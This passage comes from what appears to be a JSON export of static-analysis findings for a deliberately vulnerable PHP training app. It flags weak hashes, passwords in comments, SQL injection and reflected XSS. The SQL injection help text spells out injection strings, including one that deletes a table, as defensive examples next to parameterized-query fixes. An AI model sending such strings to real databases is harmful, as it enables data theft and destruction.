            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4584/?engineType=SCA&issue=8C4672FE990162B3A9E9A3B98C6FA6AA"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4707",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4707/?engineType=SCA&issue=E1EC7C119DF7FFFEB425236F98F43FA3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4751",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4751/?engineType=SCA&issue=F70162205216AACD5AA59552038E4473"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4573",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 39.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4573/?engineType=SCA&issue=88C44EA3A2B1A0FB3B9C38427D925B53"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4546",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in impossible.php on line 45.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4546/?engineType=SCA&issue=703B48012AEAD458D9A1C3115356DB65"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4436",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 25.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4436/?engineType=SCA&issue=2F633F9D7B86C2F654A7C1D8E65C7E30"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4541",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 38.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4541/?engineType=SCA&issue=6FAA2FFA81BDA015B6E2C38368029111"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4442",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 53.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4442/?engineType=SCA&issue=32B89CC5F17F9C90713FCD07FE3AA361"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4586",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4586/?engineType=SCA&issue=8D51CDA178D466B831F9A91F8DC174E3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4416",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 61 of low.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4416/?engineType=SCA&issue=20A44396C382E50E5114D6B3D543C8CD"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4370",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 67.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4370/?engineType=SCA&issue=053567477E271AC0EE79F38C0F3F7902"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4437",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 25.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4437/?engineType=SCA&issue=2F633F9D7B86C2F654A7C1D8E65C7E31"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4542",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 39.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4542/?engineType=SCA&issue=6FAA2FFA81BDA015B6E2C38368029112"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4443",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 61.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4443/?engineType=SCA&issue=32B89CC5F17F9C90713FCD07FE3AA362"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4627",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4627/?engineType=SCA&issue=AB7E3BA42F77F50C64C20E71BE0641E3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4696",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 69 of medium.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4696/?engineType=SCA&issue=DC44B7114467267082258B17E27CBEFD"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4371",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 75.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4371/?engineType=SCA&issue=053567477E271AC0EE79F38C0F3F7903"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4484",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 12 of jsonp.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
